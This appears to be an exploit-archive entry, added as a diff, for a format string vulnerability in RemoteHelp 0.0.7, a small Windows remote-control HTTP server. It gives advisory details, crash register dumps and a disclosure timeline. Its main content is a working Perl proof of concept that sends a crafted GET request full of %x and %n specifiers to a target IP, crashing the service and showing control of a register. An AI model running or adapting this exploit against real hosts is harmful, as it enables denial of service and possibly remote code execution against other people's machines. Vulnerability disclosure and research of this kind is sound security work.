@@ -1,0 +1,124 @@
+id: 11405
+date: 03/23/2010
+title: RemoteHelp v0.0.7 Denial of Service Exploit
+author: Rick
+cves: 
+
+===========================================
+RemoteHelp v0.0.7 Denial of Service Exploit
+===========================================
+
+
+0x00 : Vulnerability information
+--------------------------------
+
+[*] Product : RemoteHelp
+[*] Version : 0.0.7
+[*] Vendor : http://hipernes.sdf-eu.org/
+[*] URL : http://hipernes.sdf-eu.org/
+[*] URL : http://www.softpedia.com/progDownload/Remote-Help-Download-144888.html 
+[*] URL : http://sourceforge.net/projects/remotehelp 
+[*] Platform : Windows XP
+[*] Type of vulnerability : Format String 
+[*] Risk rating : Low/Medium
+[*] Issue fixed in version : Unknown
+[*] Vulnerability discovered by : Rick2600
+[*] Corelan Team : http://www.corelan.be:8800/index.php/security/corelan-team-members/
+
+
+0x01 : Vendor description of software
+-------------------------------------
+>From the vendor website:
+
+RemoteHelp is a minimal http server that allows to view and control a remote pc running a 32-bits
+
+version of Microsoft Windows. It is only one file without any configuration file and now include
+
+webcam support, new interface and new features...
+
+
+
+0x02 : Vulnerability details
+----------------------------
+The discovered vulnerability allows an attacker to cause denial of service in the aplication by sending a
+malicious request containing format string specifier. Remote code execution may be possible. 
+
+EAX 41424344
+ECX 00E7F818
+EDX 00000000
+EBX 0000006E
+ESP 00D3F2FC ASCII "0000000000000..."
+EBP 00D3F550
+ESI 00000001
+EDI 00D3FE27 ASCII "XDCBA>"
+EIP 00414DFC httpd_0_.00414DFC
+
+
+
+0x03 : Vendor communication
+---------------------------
+01 feb 2010 : Vendor contacted - no reply 
+20 mar 2010 : Public disclosure
+
+
+0x04 : Exploit/PoC
+------------------
+# Exploit Title : Remote Help 0.0.7 Remote DoS
+# Date          : 20 Mar 2010
+# Author        : Rick2600 (ricks2600[at]gmail{dot}com)
+# Bug found by  : Rick2600
+# Software Link : http://www.softpedia.com/progDownload/Remote-Help-Download-144888.html
+# Version       : 0.0.7
+# OS            : Windows
+# Tested on     : XP SP2 En
+# Type of vuln  : DoS
+# Greetz to     : Corelan Security Team : http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+#
+#
+# Code :
+print "|------------------------------------------------------------------|\n";
+print "|                         __               __	       	           |\n";
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
+print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
+print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
+print "|                                                                  |\n";
+print "|                                       http://www.corelan.be:8800 |\n";
+print "|                                                                  |\n";
+print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
+print "[+] DoS exploit for Remote Help 0.0.7 Http\n";
+
+use IO::Socket; 
+
+if ($#ARGV != 0) { 
+    print $#ARGV;
+    print "\n  usage: $0 <targetip>\n"; 
+    exit(0); 
+} 
+
+
+print "[+] Connecting to server $ARGV[0] on port 80\n\n";
+
+$remote = IO::Socket::INET->new( Proto => "tcp",
+                                 PeerAddr  => $ARGV[0],
+                                 PeerPort  => "http(80)",
+);
+unless ($remote) { die "Cannot connect to Remote Help daemon on $ARGV[0]\n" }
+print "[+] Connected!\n";
+
+
+#CONTROL EAX
+$payload = "/index.html" . "%x" x 90 . "A" x 250 . "%x" x 186  ."%.999999x" x 15 ."%.199999x"  . "%nX" . "DCBA";
+
+
+print "[+] Sending Malicious Request\n";
+print $remote "GET $payload HTTP/1.1\r\n";
+close $remote;
+
+
+
+
+#  0day.today [2023-03-24]  #
